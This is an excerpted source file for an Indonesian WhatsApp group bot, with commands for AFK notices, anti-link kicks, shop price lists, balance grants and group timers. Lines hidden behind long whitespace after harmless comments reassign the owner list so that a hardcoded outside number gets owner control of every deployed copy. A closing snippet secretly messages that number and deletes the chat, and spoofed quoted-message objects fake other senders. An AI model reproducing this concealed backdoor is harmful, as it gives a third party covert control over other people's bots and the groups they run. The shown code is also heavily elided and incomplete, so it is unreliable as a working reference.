...
Mainlagi = `ᴍᴀɪɴ ʟᴀɢɪ`
const extream = ["6283151844084-1631344300@g.us"]
...
let ownerNumber = [`6281216014295@s.whatsapp.net`,`6285813505383@s.whatsapp.net`]
...
/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6283151844084@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6283151844084@s.whatsapp.net`,`6281216014295@s.whatsapp.net`,`6285813505383@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = xdev = async (xdev, dev, baterai) => {
	try {
      ...
      if (multi){
	  var prefix = /^[°#$+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°#$+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
	  var thePrefix = "Multi Prefix"
      } else if (nopref){
      var  prefix = ''
      var thePrefix ="No prefix"
      } else if (allpref){
      var prefix = /^[°#$*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°#$*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
      ...
      var thePrefix = prefa
		...
		let senderr = dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid
...
const isAfkOn = afk1.checkAfkUser(sender, _afk)
...
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6283151844084-1631344300@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
const fvideo = { key: {fromMe: false,participant: `6283151844084@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
...
const fgif = { key: {fromMe: false,participant: `6283151844084@s.whatsapp.net`, ...(from ? { remoteJid: "6283151844084-1631344300@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
...
if(replyType === "web"){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { forward, externalAdReply:{title: `${fake}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`https://m.youtube.com/watch?v=-L9NjhcBnfw`}}})
...
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { externalAdReply: { title: `${fake}`, body: `${copyright}`, thumbnailUrl: '', thumbnail: thumb, mediaType:"2", previewType: "VIDEO", mediaUrl: "https://youtu.be/-L9NjhcBnfw"}}})
} else {
...
const sendMessa = (hehe, teks) => {
xdev.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, {contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
}
const costum = (pesan) => {
if (Loading){
...
if (isGroup && !m.isBaileys) {
						...
						if (mentionUser.length !== 0){
							...
							for (let ment of mentionUser) {
								if (afk1.checkAfkUser(ment, _afk)) {
									const getId = afk1.getAfkId(ment, _afk)
									const getReason = afk1.getAfkReason(getId, _afk)
									const getTime = Date.now() - afk1.getAfkTime(getId, _afk)
									const heheh = ms(getTime)
								mentions(`AFK MODE\n\n@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`, [ment], true)
							xdev.sendMessage(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nIn Group : ${groupName}\n`)
}
						}
					}
				if (afk1.checkAfkUser(sender, _afk)) {
					const getId = afk1.getAfkId(sender, _afk)
					const reason = afk1.getAfkReason(sender, _afk)
					const getTime = Date.now() - afk1.getAfkTime(getId, _afk)
					const heheh = ms(getTime)
					_afk.splice(afk1.getAfkPosition(sender, _afk), 1)
					mentions(`@${sender.split("@")[0]} telah kembali afk setelah *${reason}*\nSejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu\n\nselamat datang kembali`, [sender], true)
...
const getPosisi = (userId, _dir) => {
       ...
       let anu = await xdev.groupMetadata(from)
       let members = anu.participants
       let ane = []
       for (let i of members){
       ane.push(i.jid)
}
       xdev.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('stik/allmenu.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}            
...
setReply(`wa.me/@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
var msg = { ...dev };
...
console.log( color("[ANTI-HIDETAG]", "red"), color(`wa.me/${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
...
//ANTI LINK 
if (isGroup && isAntiLink && !isOwner && isBotGroupAdmins && isUrl(budy)){
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
...
//Waktu sewa group      
if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, hubungi .owner untuk menambah waktu sewa")){
await sendMess("Bye")
setTimeout( () => {
...
let id_vote = sender ? sender : '6283151844084@s.whatsapp.net'
...
addSpam("NotCase",senderNumber, "2s", AntiSpam)
}
}
...
const inus = await fs.readdirSync('./lib')
...
const isPrice = inus.includes(`${from}.json`)
var lists = fs.readdirSync('./lib') 
let list;
if(lists.includes(from+'.json')){
list = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
} else {
list = [{id: ''}]
}
let ser = list.map(x => x.id)
if(ser.includes(body.slice(1).toUpperCase()) && isCmd) {
var listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
ane = listadd.filter(g => g.id.includes(body.slice(1).toUpperCase()))
if(ane[0].reason == '') return reply('isi dulu harganya bang lah buset')
if(ane[0].type == 'image') {
tess = ane[0].caption
xdev.sendMessage(from, fs.readFileSync(ane[0].reason), image, {quoted: dev,caption: tess, thumbnail: Buffer.alloc(0)}, {quoted:dev, contextInfo:{ mentionedJid:[sender]}})
} else {
xdev.sendMessage(from,ane[0].reason,text,{quoted:dev, contextInfo : {mentionedJid: [sender]}})
}
return
}
switch(budy.toUpperCase()) {
case 'P':
case 'PROSES':
if (!isGroup) return 
				if (!isGroupAdmins) return 
				quotedText = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             xdev.sendMessage(from, `_Pesanan_:\n${quotedText}\n\n_Status pesanan_ : *Diproses⌛*\n_Tanggal_ : *${calender}*\n_Jam_ : *${timeWib} WIB*\n\n*Pesanan @${mentionByReply.split("@")[0]} sedang di proses*`, MessageType.text , { quoted: setQuoted, contextInfo:{ mentionedJid:[mentionByReply]}})
...
case 'DONE':
     if (!isGroup) return 
				if (!isGroupAdmins) return 
            quotedText = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             xdev.sendMessage(from, `_Pesanan_:\n${quotedText}\n\n_Status pesanan_ : *Terkirim*✅\n_Tanggal_ : *${calender}*\n_Jam_ : *${timeWib} WIB*\n\n*Pesanan @${mentionByReply.split("@")[0]} selesai*\n*Terimakasih*`, MessageType.text, { quoted: setQuoted, contextInfo:{ mentionedJid:[mentionByReply]}})
...
if(!q) return setReply("Masukan nominal saldo")
susu = math(q)
addBalance(Nomer, susu, user)
setReply(`Berhasil menambahkan saldo sebesar ${q} ke nomer ${Nomer}`)
}
break
...
if(mentionByReply){
Nomer =`${mentionByReply.split("@")[0]}`
if(!q) return setReply("Masukan jumlah")
susu = math(q)
addLevelingLevel(Nomer, susu, user)
setReply(`Berhasil menambahkan level ${q} ke nomer ${Nomer}`)
}
break
...
let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
  ...
  options = {quoted: setQuoted, contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:"https://youtu.be/-L9NjhcBnfw"}}}  
options1 = {quoted: setQuoted, contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: thumb,mediaUrl:`https://youtu.be/-L9NjhcBnfw`}}}
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(menunya)
}  else if(setmenu === "troli") {
...
case 'kirin':
      if(isExtream) return
           ...
           xdev.sendMessage(from, {
                        'groupName': fake,
                        'groupJid': '6283151844084-1631344300@g.us',
...
if (!isGroup) return setReply("Hanya bisa di group")
													...
													if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
await xdev.sendMessage(from,`Berhasil menambahkan @${mentionByReply.split("@")[0]} ke dalam group ${groupName}`,text, {quoted: setQuoted, contextInfo:{ mentionedJid:[mentionByReply]}});          
} else{
...
case 'giftgamelimit':
                       ...
                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
                       lim = q.split(" ")[1]
                       const tag2 = `${q.split(" ")[0].replace("@",'')}`
                       givegame(tag2, lim, user)
                       setReply('Succes')
                       break
 ...
 *Expired : ${premiumnya}*`
                    ...
                    xdev.sendMessage(from, its, image, {contextInfo:{ mentionedJid:[senderr]}, caption: teks
                     })
                     break
...
if(!isGroup) return setReply("Maap om aku masih blom cukup umur")
           ...
           case 'diem':
			     if (!isOwner && !isGroupAdmins) return onlyOwner()
			    if (!isGroup) return 
			...
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				...
				setTimeout( () => {
					...
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split('@')[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
...
break
    ...
    case 'reverse':
       ...
       case 'sc': 
       case 'src':
              xdev.sendMessage(from, `Bot ini menggunakan sc dari bang @6283151844084 dan youtubenya https://youtu.be/-L9NjhcBnfw`, text, {quoted : dev, detecLinks : true, contextInfo:{ mentionedJid:[Ownerin]}})
              break
...
if(!isOwner) return reply('eits ngapain')
	if(!args.join(' ')) return reply('1 aktif dan 0 nonaktifkan')
	
	if(args[0] == 1) {
		if(isPrice) return reply ('*Fitur Diaktifkan*')
	fs.writeFileSync(`./lib/${from}.json`, '[]')
	xdev.sendMessage(from, `*Berhasil mengaktifkan list*`, MessageType.text, { quoted: dev })
	} else if(args[0] == 0) {
		
		if(!isPrice) return reply ('sudah mati')
fs.rmSync(`./lib/${from}.json`)
	
	xdev.sendMessage(from, `*Berhasil menonaktifkan list*`, MessageType.text, { quoted: dev })
	}
...
case 'listadd':
	...
	if (!isGroupAdmins) return
	if(!isPrice) return reply('List price Belum hidup')
	if(!args.join(' ')) return reply('masukan judul shop')
	if(args.join(' ').length > 50 ) return reply('judulnya kepanjangan om')
	listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
	listadd.push({id: args.join(' ').toUpperCase(),type: '',reason: ''})
	asw = listadd.filter(g => g.id.includes(q.split(',')[0].toUpperCase())) 
	if(isQuotedImage){
     asw[0].type = 'image'
imeg = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fileName = await xdev.downloadAndSaveMediaMessage(imeg, `./temp/${Date.now()}`)
     asw[0].reason = `${fileName}`
     asw[0].caption = q.split(',')[1]
     fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(listadd))
	xdev.sendMessage(from, `*Berhasil menambahkan list ${asw[0].id}*`, MessageType.text, { quoted: dev })
} else {
	asw[0].type = 'teks'
	asw[0].reason = q.split(',')[1]
	fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(listadd))
	xdev.sendMessage(from, `*Sukses menambahkan list menu ${asw[0].id}*`, MessageType.text, { quoted: dev })
...
if(!isPrice) return reply('List price Belum hidup')
	...
	if(args.join(' ').length > 50 ) return reply('judulnya kepanjangan om')
	listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
	listadd.splice(getPosisi(args.join(' ').toUpperCase(), listadd), 1)
	fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(listadd))
	xdev.sendMessage(from, `*Berhasil Menghapus list ${args.join(' ')} dari menu ${groupName}*`, MessageType.text, { quoted: dev })
	
break
 case 'caralist':
 
 teksnya =  `*.listadd _ML_ untuk nambah list*\n*.listdel _ML_ untuk hapus list*\n*.update _ML,masukin harga_ untuk update harga.*\n_note: Tidak memakai tanda baca koma(,)agar tidak terjadi bug_\n*.list Untuk munculin list harga*\n*.resetlist Untuk menghapus semua list*`
 xdev.sendMessage(from, teksnya, text, {quoted: dev, contextInfo:{ mentionedJid:[sender]}})
 break
case 'update':
...
if (!isGroupAdmins) return reply(mess.only.admin)
if(!isPrice) return reply('List price Belum hidup')
	if(!q.split(',')[0]) return reply('masukan judul shop')
	if(!q.split(',')[1]) return reply('Masukan Pesan')
	listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
	asw = listadd.filter(g => g.id.includes(q.split(',')[0].toUpperCase())) 
	if(isQuotedImage){
     asw[0].type = 'image'
...
const fileName = await xdev.downloadAndSaveMediaMessage(imeg, `./temp/${Date.now()}`)
     ...
     asw[0].caption = q.split(',')[1]
     fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(listadd))
	xdev.sendMessage(from, `*Berhasil update list ${asw[0].id}*`, MessageType.text, { quoted: dev })
} else {
	asw[0].type = 'teks'
	asw[0].reason = q.split(',')[1]
	fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(listadd))
	xdev.sendMessage(from, `*Sukses update list menu ${asw[0].id}*`, MessageType.text, { quoted: dev })
...
{
"title": "CARALIST",
"rowId": `${prefix}caralist`
}]}
]
re = `*Menunya*\n📆 *${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}*\n`
for(let i of listadd) {
	re += `${prefix}`+i.id+'\n'
	}
const button = {
 buttonText: `𝗠𝗘𝗡𝗨`,
 ...
 xdev.sendMessage(from, button, MessageType.listMessage, {sendEphemeral:true, quoted:dev, contextInfo:{ forwardingScore:508, isForwarded:false, mentionedJid:[sender]}})
} else {
for(let i of listadd) {
alist.push(
{
"title": i.id,
"rowId": `${prefix}getlist ${i.id}` 
})
}


var sections = [{title: `Price`,
rows: alist
}]
re = `*List Menu*\n`
for(let i of listadd) {
...
var button = {
 ...
 xdev.sendMessage(from, button, MessageType.listMessage, {sendEphemeral:true, contextInfo:{ forwardingScore:508, isForwarded:false, mentionedJid:[sender]}})
 }
 break
case 'getlist':
...
if(!isPrice) return reply('List price Belum hidup')
listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
ane = listadd.filter(g => g.id.includes(args.join(' ').toUpperCase()))
if(ane[0].reason == '') return reply('isi dulu harganya bang lah buset')
if(ane[0].type == 'image') {
	xdev.sendMessage(from, fs.readFileSync(ane[0].reason), image, {quoted: dev, caption: ane[0].caption,thumbnail: Buffer.alloc(0)}, {contextInfo:{ mentionedJid:[sender]}})
	} 
else {
xdev.sendMessage(from,ane[0].reason,text,{quoted:dev, contextInfo : {mentionedJid: [sender]}})
}
...
case 'resetlist':
listadd = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
listadd.splice('reset')
fs.writeFileSync('./lib/'+from+'.json',JSON.stringify(listadd))
xdev.sendMessage(from, `*Sukses reset list menu ${groupName}*`, MessageType.text, { quoted: dev })
break
case 'afk':
									...
									afk1.addAfkUser(sender, Date.now(), reason, _afk)
									mentions(`─「 *AFK MODE* 」─

@${sender.split('@')[0]} sedang afk!
Alasan : ${reason}`, [sender], {quoted : dev}, true)
									break
case 'antiwame':
                ...
                if (args[0] === 'on'){
              	...
              	var ini_gopayy =`Halo @${senderr.split('@')[0]} klik button atau Gunakan ${prefix + command } on / off jika button tidak merespon`
var buttonss = [
...
xdev.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: '[ • KENZ • ]',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 0,
...
let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
teks = `Nih youtube Developer aku 🤗\nLink: https://m.youtube.com/watch?v=-L9NjhcBnfw`
nana = `https://i.ytimg.com/vi/TOmXzkWuCWk/mqdefault.jpg`

foto = await getBuffer(nana)
options1 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: foto, mediaUrl:`https://m.youtube.com/watch?v=-L9NjhcBnfw`}}}
...
//options = { quoted: fkontak, contextInfo: { forward, externalAdReply:{title: `SYSTEM-ERROR`,body:`🕒 ${timeWib}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg')}}}
...
await xdev.sendMessage(Ownerin, tolol, MessageType.buttonsMessage, {quoted: fkontak})
await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
